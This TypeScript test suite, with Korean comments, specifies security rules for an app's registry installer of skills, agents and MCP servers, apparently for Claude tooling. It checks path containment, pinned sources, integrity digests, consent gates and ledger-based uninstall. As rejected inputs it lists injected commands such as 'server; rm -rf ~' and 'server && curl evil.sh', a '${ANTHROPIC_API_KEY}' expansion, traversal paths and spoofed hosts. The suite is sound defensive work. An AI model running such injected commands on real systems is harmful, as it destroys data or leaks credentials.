/**
 * registry-installer 보안 경계 스펙 (설계 §4.4 / §8 CRITICAL 경로).
 *
 * 여기 케이스들은 "테스트"라기보다 설치기의 하드룰 명세다: 경로탈출,
 * 임의 커맨드, env 유출, 내장 카탈로그 가림, 원장 기반 uninstall.
 * 하나라도 빠지면 untrusted manifest 가 사용자 머신을 쓸 수 있게 된다.
 */
import crypto from "crypto";
import fs from "fs";
import os from "os";
import path from "path";
import { describe, expect, it } from "vitest";
import type {
  RegistryItem,
  RegistryMcpInstall,
} from "../../electron/registry-client";
import {
  buildMcpServerEntry,
  installRegistryItem,
  resolveContainedDest,
  uninstallRegistryItem,
  validateDest,
  validateRelFilePath,
  type InstallerDeps,
} from "../../electron/registry-installer";
import { readLedger } from "../../electron/registry-ledger";

const COMMIT = "a".repeat(40);

function tmpdir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function skillItem(overrides: Partial<RegistryItem> = {}): RegistryItem {
  return {
    schemaVersion: 1,
    id: "test-skill",
    name: "Test Skill",
    type: "skill",
    version: "1.0.0",
    description: "test",
    tier: "official",
    publisherName: "Marblo",
    status: "active",
    permissions: [],
    permissionsDeclared: true,
    path: "skills/test-skill",
    commit: COMMIT,
    install: {
      kind: "files",
      root: "claude-skills",
      dest: "test-skill",
      files: ["SKILL.md"],
    },
    installDerived: true,
    ...overrides,
  };
}

function mcpInstall(
  overrides: Partial<RegistryMcpInstall> = {},
): RegistryMcpInstall {
  return {
    kind: "mcp-server",
    runner: "npx",
    package: "@scope/server@1.2.3",
    args: [],
    envRequired: [],
    mcpKey: "test-server",
    ...overrides,
  };
}

function mcpItem(overrides: Partial<RegistryItem> = {}): RegistryItem {
  return {
    ...skillItem(),
    id: "test-mcp",
    type: "mcp-server",
    schemaVersion: 2,
    path: "mcp-servers/test-mcp",
    install: mcpInstall(),
    installDerived: false,
    ...overrides,
  };
}

/** 스텁 fetch: repoPath 별 콘텐츠 맵. 등록 안 된 경로는 404. */
function stubFetch(filesByUrlSuffix: Record<string, string>): typeof fetch {
  return (async (url: unknown) => {
    const u = String(url);
    const hit = Object.entries(filesByUrlSuffix).find(([suffix]) =>
      u.endsWith(suffix),
    );
    if (!hit) return { ok: false, status: 404 } as Response;
    const body = Buffer.from(hit[1], "utf-8");
    return {
      ok: true,
      status: 200,
      arrayBuffer: async () =>
        body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength),
    } as unknown as Response;
  }) as typeof fetch;
}

interface TestEnv {
  deps: InstallerDeps;
  root: string;
  claudeJson: { mcpServers?: Record<string, unknown> };
}

function makeEnv(fetchImpl?: typeof fetch): TestEnv {
  const base = tmpdir("marblo-registry-sec-");
  const root = path.join(base, "skills-root");
  fs.mkdirSync(root, { recursive: true });
  const claudeJson: TestEnv["claudeJson"] = {};
  const deps: InstallerDeps = {
    ledgerPath: path.join(base, "registry-installs.json"),
    rootsOverride: { "claude-skills": root },
    claudeJsonIo: {
      read: () => claudeJson as Record<string, unknown>,
      write: (data) => Object.assign(claudeJson, data),
    },
    fetchImpl: fetchImpl ?? stubFetch({ "SKILL.md": "# skill" }),
  };
  return { deps, root, claudeJson };
}

// ── CRITICAL: 경로 탈출 (§4.4 rule 1·2) ────────────────────────────

describe("dest containment", () => {
  it.each([
    "../../..",
    "..",
    ".",
    "/etc",
    "a/b",
    "a\\b",
    "A-upper",
    "한글",
    "a..b",
    "",
  ])("rejects dest %j", (dest) => {
    expect(() => validateDest(dest)).toThrow(/설치 거부/);
  });

  it("rejects a dest that is an existing symlink pointing outside root", () => {
    const { root } = makeEnv();
    const outside = tmpdir("marblo-outside-");
    fs.symlinkSync(outside, path.join(root, "escape-link"));
    expect(() => resolveContainedDest(root, "escape-link")).toThrow(/심링크/);
  });

  it("rejects an unknown root key (enum only — manifest cannot supply paths)", async () => {
    const { deps } = makeEnv();
    const item = skillItem({
      install: {
        kind: "files",
        root: "evil-root" as "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /root "evil-root"/,
    );
  });

  // root 는 타입에 묶여 있다(공개 스키마의 install allOf 와 1:1). 에이전트 트리에
  // 떨어진 파일은 하네스가 매 세션 로드하는 페르소나가 되므로, "스킬로 리뷰됐는데
  // 에이전트로 착지" 는 조용한 권한 상승이다 — 양방향 모두 installer 가 막는다.
  it("rejects a skill that declares the agents root", async () => {
    const { deps, root } = makeEnv();
    deps.rootsOverride = {
      "claude-skills": root,
      "claude-agents": path.join(root, "..", "agents-root"),
    };
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-agents",
        dest: "test-skill",
        files: ["SKILL.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /type "skill" 은 root "claude-skills" 에만/,
    );
  });

  it("rejects an agent that declares the skills root", async () => {
    const { deps, root } = makeEnv();
    deps.rootsOverride = {
      "claude-skills": root,
      "claude-agents": path.join(root, "..", "agents-root"),
    };
    const item = skillItem({
      id: "qa-engineer",
      type: "agent",
      path: "agents/qa-engineer",
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "qa-engineer",
        files: ["AGENT.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /type "agent" 은 root "claude-agents" 에만/,
    );
  });

  it("installs an agent into the agents root and records it in the ledger", async () => {
    const { deps, root } = makeEnv(stubFetch({ "AGENT.md": "# agent" }));
    const agentsRoot = path.join(path.dirname(root), "agents-root");
    deps.rootsOverride = {
      "claude-skills": root,
      "claude-agents": agentsRoot,
    };
    const item = skillItem({
      id: "qa-engineer",
      type: "agent",
      path: "agents/qa-engineer",
      install: {
        kind: "files",
        root: "claude-agents",
        dest: "qa-engineer",
        files: ["AGENT.md"],
      },
    });
    await installRegistryItem(item, deps);
    // 하네스가 재귀 탐색하는 위치에 실제로 파일이 있어야 한다 — 원장만 맞고 디스크가
    // 비면 "설치됨" 배지가 거짓말을 한다.
    expect(
      fs.readFileSync(
        path.join(agentsRoot, "qa-engineer", "AGENT.md"),
        "utf-8",
      ),
    ).toBe("# agent");
    const entry = readLedger(deps.ledgerPath).items["qa-engineer"];
    expect(entry.install).toEqual({
      kind: "files",
      root: "claude-agents",
      dest: "qa-engineer",
    });
  });

  it.each([
    "../x",
    "/abs",
    "a/../b",
    "a\\b",
    ".hidden",
    "a/./b",
    "C:evil",
    "a//b",
  ])("rejects file path %j in the allowlist", (p) => {
    expect(() => validateRelFilePath(p)).toThrow(/설치 거부/);
  });

  it("rejects file paths deeper than 8 segments", () => {
    expect(() => validateRelFilePath("a/b/c/d/e/f/g/h/i.md")).toThrow(/깊이/);
  });
});

// ── CRITICAL: 임의 커맨드 차단 (§4.4 rule 4) ───────────────────────

describe("mcp command safety", () => {
  it("rejects a runner outside the enum (no free-form command)", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ runner: "bash" as "npx" })),
    ).toThrow(/runner/);
  });

  it("rejects docker/binary runners in Phase 1a explicitly", () => {
    expect(() => buildMcpServerEntry(mcpInstall({ runner: "docker" }))).toThrow(
      /미지원/,
    );
    expect(() => buildMcpServerEntry(mcpInstall({ runner: "binary" }))).toThrow(
      /미지원/,
    );
  });

  it.each([
    "server; rm -rf ~",
    "server && curl evil.sh",
    "server", // 버전 핀 없음
    "server@latest",
    "server@1.2",
    "../evil@1.0.0",
    "server@1.0.0 --flag",
  ])("rejects unpinned/injected package %j", (pkg) => {
    expect(() => buildMcpServerEntry(mcpInstall({ package: pkg }))).toThrow(
      /package|env 확장/,
    );
  });

  it("command is exactly the runner binary — package rides in args", () => {
    const entry = buildMcpServerEntry(mcpInstall());
    expect(entry.command).toBe("npx");
    expect(entry.args).toEqual(["-y", "@scope/server@1.2.3"]);
  });

  it("rejects an mcp_key that would shadow a builtin catalog server", () => {
    expect(() => buildMcpServerEntry(mcpInstall({ mcpKey: "github" }))).toThrow(
      /내장 카탈로그/,
    );
  });

  it("rejects installing into an existing non-ledger mcpServers key", async () => {
    const { deps, claudeJson } = makeEnv();
    claudeJson.mcpServers = { "test-server": { command: "npx" } };
    await expect(installRegistryItem(mcpItem(), deps)).rejects.toThrow(
      /이미 존재/,
    );
  });
});

// ── CRITICAL: env 유출 차단 (§4.4 rule 5) ──────────────────────────

describe("env exfiltration defenses", () => {
  it("rejects ${...} expansion syntax in args (harness CLIs expand at runtime)", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ args: ["${ANTHROPIC_API_KEY}"] })),
    ).toThrow(/env 확장/);
  });

  it("rejects env_required entries that are not bare names", () => {
    for (const bad of ["PATH=x", "lower", "1NUM", "A B", "${HOME}"]) {
      expect(() =>
        buildMcpServerEntry(mcpInstall({ envRequired: [bad] })),
      ).toThrow(/env_required/);
    }
  });

  it("rejects env_required demanding harness credentials", () => {
    expect(() =>
      buildMcpServerEntry(mcpInstall({ envRequired: ["ANTHROPIC_API_KEY"] })),
    ).toThrow(/크레덴셜/);
  });

  it("never expands values — written env is the literal ${NAME} reference", () => {
    process.env.MARBLO_TEST_SECRET_XYZ = "super-secret-value";
    try {
      const entry = buildMcpServerEntry(
        mcpInstall({ envRequired: ["MARBLO_TEST_SECRET_XYZ"] }),
      );
      expect(entry.env.MARBLO_TEST_SECRET_XYZ).toBe(
        "${MARBLO_TEST_SECRET_XYZ}",
      );
      expect(JSON.stringify(entry)).not.toContain("super-secret-value");
    } finally {
      delete process.env.MARBLO_TEST_SECRET_XYZ;
    }
  });
});

// ── 게이트: tier / status ──────────────────────────────────────────

describe("tier and status gates", () => {
  // ★렌더러의 경고 모달은 UI 일 뿐이다 — community 차단의 강제는 여기(메인
  // 프로세스 installer)다. 이 두 케이스가 빨개지면 IPC 를 직접 때리는 호출이
  // 동의 없이 미검수 페이로드를 설치할 수 있게 된 것이다.
  it("refuses community-tier installs without explicit consent", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ tier: "community" }), deps),
    ).rejects.toThrow(/community.*acknowledgeUnreviewed/);
    // truthy 로는 부족하다 — 명시적 true 만 동의다(직렬화 사고 방어).
    await expect(
      installRegistryItem(skillItem({ tier: "community" }), deps, {
        acknowledgeUnreviewed: "yes" as unknown as boolean,
      }),
    ).rejects.toThrow(/acknowledgeUnreviewed/);
  });

  it("installs community-tier items when consent is explicitly given", async () => {
    // community 는 §4.4 rule 9 에 따라 pinned source + integrity 도 필요하다 —
    // 이 스펙의 관심사는 동의 플로우이므로 그 요건을 채운 픽스처를 쓴다.
    const { deps, root } = makeEnv(stubFetch({ "SKILL.md": "# ext skill" }));
    await installRegistryItem(communityItem(), deps, {
      acknowledgeUnreviewed: true,
    });
    expect(
      fs.readFileSync(path.join(root, "ext-skill", "SKILL.md"), "utf-8"),
    ).toBe("# ext skill");
    expect(readLedger(deps.ledgerPath).items["ext-skill"]).toBeDefined();
  });

  it("consent does not bypass the revoked gate", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(
        skillItem({ tier: "community", status: "revoked" }),
        deps,
        { acknowledgeUnreviewed: true },
      ),
    ).rejects.toThrow(/회수/);
  });

  it("consent does not admit unknown tiers", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ tier: "sketchy" as "community" }), deps, {
        acknowledgeUnreviewed: true,
      }),
    ).rejects.toThrow(/알 수 없는 tier/);
  });

  it("official/verified one-click stays consent-free", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ tier: "official" }), deps),
    ).resolves.toBeUndefined();
  });

  it("refuses revoked items", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ status: "revoked" }), deps),
    ).rejects.toThrow(/회수/);
  });

  it("refuses items without an install contract", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(skillItem({ install: null }), deps),
    ).rejects.toThrow(/설치/);
  });
});

// ── files 설치 / 원장 기반 uninstall (§4.4 rule 7) ─────────────────

describe("files install + ledger-driven uninstall", () => {
  it("installs allowlisted files, records the ledger, uninstall deletes only that list", async () => {
    const { deps, root } = makeEnv(
      stubFetch({ "SKILL.md": "# skill", "docs/USAGE.md": "usage" }),
    );
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md", "docs/USAGE.md"],
      },
    });
    await installRegistryItem(item, deps);

    const dest = path.join(root, "test-skill");
    expect(fs.readFileSync(path.join(dest, "SKILL.md"), "utf-8")).toBe(
      "# skill",
    );
    expect(fs.existsSync(path.join(dest, "docs", "USAGE.md"))).toBe(true);
    const ledger = readLedger(deps.ledgerPath);
    expect(ledger.items["test-skill"].files?.map((f) => f.path)).toEqual([
      "SKILL.md",
      "docs/USAGE.md",
    ]);

    // 사용자 파일은 남긴다 — 원장 목록만 지운다.
    fs.writeFileSync(path.join(dest, "user-note.md"), "mine");
    uninstallRegistryItem("test-skill", deps);
    expect(fs.existsSync(path.join(dest, "SKILL.md"))).toBe(false);
    expect(fs.existsSync(path.join(dest, "docs"))).toBe(false);
    expect(fs.readFileSync(path.join(dest, "user-note.md"), "utf-8")).toBe(
      "mine",
    );
    expect(readLedger(deps.ledgerPath).items["test-skill"]).toBeUndefined();
  });

  it("a manifest edited after install cannot redirect the delete (ledger only)", async () => {
    const { deps, root } = makeEnv();
    await installRegistryItem(skillItem(), deps);
    // 공격 시나리오: 설치 후 manifest 의 dest 가 다른 곳을 가리키게 바뀌어도
    // uninstall 은 id → 원장 레코드만 본다. (API 상 manifest 를 받지도 않는다.)
    const victim = path.join(root, "innocent");
    fs.mkdirSync(victim);
    fs.writeFileSync(path.join(victim, "keep.txt"), "keep");
    uninstallRegistryItem("test-skill", deps);
    expect(fs.readFileSync(path.join(victim, "keep.txt"), "utf-8")).toBe(
      "keep",
    );
  });

  it("refuses to overwrite an existing dest the ledger does not own", async () => {
    const { deps, root } = makeEnv();
    fs.mkdirSync(path.join(root, "test-skill"));
    fs.writeFileSync(path.join(root, "test-skill", "SKILL.md"), "user content");
    await expect(installRegistryItem(skillItem(), deps)).rejects.toThrow(
      /원장 소유가 아님/,
    );
    expect(
      fs.readFileSync(path.join(root, "test-skill", "SKILL.md"), "utf-8"),
    ).toBe("user content");
  });

  it("refuses a silent overwrite of locally modified files on update", async () => {
    const { deps, root } = makeEnv();
    await installRegistryItem(skillItem(), deps);
    fs.writeFileSync(
      path.join(root, "test-skill", "SKILL.md"),
      "locally edited",
    );
    await expect(
      installRegistryItem(skillItem({ version: "1.1.0" }), deps),
    ).rejects.toThrow(/로컬 수정/);
    // 명시적 확인 후에만 덮는다.
    await installRegistryItem(skillItem({ version: "1.1.0" }), deps, {
      overwriteLocalChanges: true,
    });
    expect(
      fs.readFileSync(path.join(root, "test-skill", "SKILL.md"), "utf-8"),
    ).toBe("# skill");
  });

  it("leaves no partial install when a fetch fails mid-way", async () => {
    const { deps, root } = makeEnv(stubFetch({ "SKILL.md": "# skill" }));
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md", "MISSING.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(/404/);
    expect(fs.existsSync(path.join(root, "test-skill"))).toBe(false);
    expect(
      fs.readdirSync(root).filter((n) => n.startsWith(".reg-staging")),
    ).toEqual([]);
    expect(readLedger(deps.ledgerPath).items["test-skill"]).toBeUndefined();
  });

  it("rejects a files dest that shadows a builtin catalog skill", async () => {
    const { deps } = makeEnv();
    const item = skillItem({
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "gstack",
        files: ["SKILL.md"],
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(
      /내장 카탈로그/,
    );
  });

  it("verifies per-file integrity digests when the manifest carries them", async () => {
    const { deps } = makeEnv(stubFetch({ "SKILL.md": "tampered" }));
    const item = skillItem({
      schemaVersion: 2,
      install: {
        kind: "files",
        root: "claude-skills",
        dest: "test-skill",
        files: ["SKILL.md"],
        integrity: { "SKILL.md": "0".repeat(64) },
      },
    });
    await expect(installRegistryItem(item, deps)).rejects.toThrow(/integrity/);
  });
});

// ── CRITICAL: community source fetch (§4.4 rule 9) ─────────────────
//
// community 페이로드는 레지스트리 레포가 아니라 **3자 source repo** 에서 온다.
// 이 블록은 그 경로의 공급망 가드 명세다: pinned ref 강제(가변 브랜치 거부),
// 호스트 allowlist(앱이 URL 을 조립 — manifest 는 좌표만), 파일 전수 integrity,
// consent 게이트 불변. 하나라도 빠지면 "설치되는 바이트 ≠ 리뷰된 바이트"다.

const SRC_SHA = "f".repeat(40);

function communityItem(overrides: Partial<RegistryItem> = {}): RegistryItem {
  return skillItem({
    id: "ext-skill",
    tier: "community",
    path: "skills/ext-skill",
    sourceRepository: "https://github.com/acme/claude-skills",
    sourceRef: SRC_SHA,
    sourcePath: "skills/ext",
    install: {
      kind: "files",
      root: "claude-skills",
      dest: "ext-skill",
      files: ["SKILL.md"],
      integrity: { "SKILL.md": sha256Hex("# ext skill") },
    },
    installDerived: false,
    ...overrides,
  });
}

function sha256Hex(s: string): string {
  return crypto
    .createHash("sha256")
    .update(Buffer.from(s, "utf-8"))
    .digest("hex");
}

/** 스텁 fetch + 요청 URL 캡처 — "어디로 나갔는가"가 이 블록의 단언 대상이다. */
function capturingStubFetch(filesByUrlSuffix: Record<string, string>): {
  fetchImpl: typeof fetch;
  urls: string[];
} {
  const urls: string[] = [];
  const base = stubFetch(filesByUrlSuffix);
  const fetchImpl = (async (url: unknown, init?: unknown) => {
    urls.push(String(url));
    return (base as (u: unknown, i?: unknown) => Promise<Response>)(url, init);
  }) as typeof fetch;
  return { fetchImpl, urls };
}

describe("community source fetch (§4.4 rule 9)", () => {
  const CONSENT = { acknowledgeUnreviewed: true };

  it("fetches from the pinned 3rd-party source URL, not the registry repo", async () => {
    const { fetchImpl, urls } = capturingStubFetch({
      "SKILL.md": "# ext skill",
    });
    const { deps, root } = makeEnv(fetchImpl);
    await installRegistryItem(communityItem(), deps, CONSENT);
    expect(urls).toEqual([
      `https://raw.githubusercontent.com/acme/claude-skills/${SRC_SHA}/skills/ext/SKILL.md`,
    ]);
    expect(
      fs.readFileSync(path.join(root, "ext-skill", "SKILL.md"), "utf-8"),
    ).toBe("# ext skill");
    const entry = readLedger(deps.ledgerPath).items["ext-skill"];
    expect(entry.sourceRepository).toBe(
      "https://github.com/acme/claude-skills",
    );
    expect(entry.sourceRef).toBe(SRC_SHA);
  });

  it("accepts a version-tag pin and omits the path prefix when sourcePath is absent", async () => {
    const { fetchImpl, urls } = capturingStubFetch({
      "SKILL.md": "# ext skill",
    });
    const { deps } = makeEnv(fetchImpl);
    await installRegistryItem(
      communityItem({ sourceRef: "v1.7.0", sourcePath: undefined }),
      deps,
      CONSENT,
    );
    expect(urls).toEqual([
      "https://raw.githubusercontent.com/acme/claude-skills/v1.7.0/SKILL.md",
    ]);
  });

  it("official installs keep fetching from the registry repo at the pinned commit", async () => {
    const { fetchImpl, urls } = capturingStubFetch({ "SKILL.md": "# skill" });
    const { deps } = makeEnv(fetchImpl);
    await installRegistryItem(skillItem(), deps);
    expect(urls).toEqual([
      `https://raw.githubusercontent.com/marblo-app/marblo/${COMMIT}/skills/test-skill/SKILL.md`,
    ]);
    const entry = readLedger(deps.ledgerPath).items["test-skill"];
    expect(entry.sourceRepository).toBeUndefined();
  });

  it("★the consent gate is unchanged — no acknowledgeUnreviewed, no fetch at all", async () => {
    const { fetchImpl, urls } = capturingStubFetch({
      "SKILL.md": "# ext skill",
    });
    const { deps } = makeEnv(fetchImpl);
    await expect(installRegistryItem(communityItem(), deps)).rejects.toThrow(
      /acknowledgeUnreviewed/,
    );
    expect(urls).toEqual([]);
  });

  it.each([
    "main",
    "master",
    "HEAD",
    "develop",
    "feature/x",
    "refs/heads/main",
  ])(
    "rejects the moving ref %j (pinned SHA or version tag only)",
    async (ref) => {
      const { deps } = makeEnv();
      await expect(
        installRegistryItem(communityItem({ sourceRef: ref }), deps, CONSENT),
      ).rejects.toThrow(/pinned 참조가 아님/);
    },
  );

  it("rejects a community item with no source coordinates at all", async () => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(
        communityItem({ sourceRepository: undefined, sourceRef: undefined }),
        deps,
        CONSENT,
      ),
    ).rejects.toThrow(/source\.repository/);
  });

  it.each([
    "https://evil.com/acme/skills",
    "http://github.com/acme/skills",
    "https://github.com.evil.com/acme/skills",
    "https://github.com/acme/skills/extra",
    "https://raw.githubusercontent.com/acme/skills",
    "git@github.com:acme/skills",
    "https://github.com/acme/..",
    "https://github.com/-bad/skills",
  ])("rejects the non-allowlisted repository %j", async (repository) => {
    const { deps } = makeEnv();
    await expect(
      installRegistryItem(
        communityItem({ sourceRepository: repository }),
        deps,
        CONSENT,
      ),
    ).rejects.toThrow(/source\.repository|허용 호스트/);
  });

  it.each(["../up", "a/../b", "/abs", "a\\b", ".hidden/x"])(
    "rejects the traversal-shaped sourcePath %j",
    async (sourcePath) => {
      const { deps } = makeEnv();
      await expect(
        installRegistryItem(communityItem({ sourcePath }), deps, CONSENT),
      ).rejects.toThrow(/설치 거부/);
    },
  );

  it("requires an integrity digest for every file — a tag pin alone is not a pin", async () => {
    const { deps } = makeEnv();
    const item = communityItem();
    (item.install as { integrity?: Record<string, string> }).integrity = {};
    await expect(installRegistryItem(item, deps, CONSENT)).rejects.toThrow(
      /전수 integrity/,
    );
  });

  it("rejects bytes that do not match the reviewed digest", async () => {
    const { fetchImpl } = capturingStubFetch({ "SKILL.md": "tampered bytes" });
    const { deps, root } = makeEnv(fetchImpl);
    await expect(
      installRegistryItem(communityItem(), deps, CONSENT),
    ).rejects.toThrow(/integrity 불일치/);
    expect(fs.existsSync(path.join(root, "ext-skill"))).toBe(false);
  });

  it("enforces the per-file size cap on source fetches (reject, not truncate)", async () => {
    const big = Buffer.alloc(5 * 1024 * 1024 + 1);
    const fetchImpl = (async () =>
      ({
        ok: true,
        status: 200,
        arrayBuffer: async () =>
          big.buffer.slice(big.byteOffset, big.byteOffset + big.byteLength),
      }) as unknown as Response) as typeof fetch;
    const { deps } = makeEnv(fetchImpl);
    await expect(
      installRegistryItem(communityItem(), deps, CONSENT),
    ).rejects.toThrow(/한도/);
  });

  it("community agents install from source into the agents root", async () => {
    const { fetchImpl, urls } = capturingStubFetch({
      "electron-pro.md": "# agent persona",
    });
    const { deps, root } = makeEnv(fetchImpl);
    const agentsRoot = path.join(path.dirname(root), "agents-root");
    deps.rootsOverride = { "claude-skills": root, "claude-agents": agentsRoot };
    const item = communityItem({
      id: "voltagent-electron-pro",
      type: "agent",
      path: "agents/voltagent-electron-pro",
      sourceRepository:
        "https://github.com/VoltAgent/awesome-claude-code-subagents",
      sourcePath: "categories/01-core-development",
      install: {
        kind: "files",
        root: "claude-agents",
        dest: "voltagent-electron-pro",
        files: ["electron-pro.md"],
        integrity: { "electron-pro.md": sha256Hex("# agent persona") },
      },
    });
    await installRegistryItem(item, deps, CONSENT);
    expect(urls).toEqual([
      `https://raw.githubusercontent.com/VoltAgent/awesome-claude-code-subagents/${SRC_SHA}/categories/01-core-development/electron-pro.md`,
    ]);
    expect(
      fs.readFileSync(
        path.join(agentsRoot, "voltagent-electron-pro", "electron-pro.md"),
        "utf-8",
      ),
    ).toBe("# agent persona");
  });
});

// ── mcp-server 설치 왕복 ───────────────────────────────────────────

describe("mcp-server install/uninstall", () => {
  it("writes the config entry and removes it ledger-driven", async () => {
    const { deps, claudeJson } = makeEnv();
    const item = mcpItem({
      install: mcpInstall({ envRequired: ["GITHUB_TOKEN"] }),
    });
    await installRegistryItem(item, deps);
    expect(claudeJson.mcpServers?.["test-server"]).toEqual({
      command: "npx",
      args: ["-y", "@scope/server@1.2.3"],
      env: { GITHUB_TOKEN: "${GITHUB_TOKEN}" },
    });
    expect(readLedger(deps.ledgerPath).items["test-mcp"].install.mcpKey).toBe(
      "test-server",
    );
    uninstallRegistryItem("test-mcp", deps);
    expect(claudeJson.mcpServers?.["test-server"]).toBeUndefined();
    expect(readLedger(deps.ledgerPath).items["test-mcp"]).toBeUndefined();
  });
});
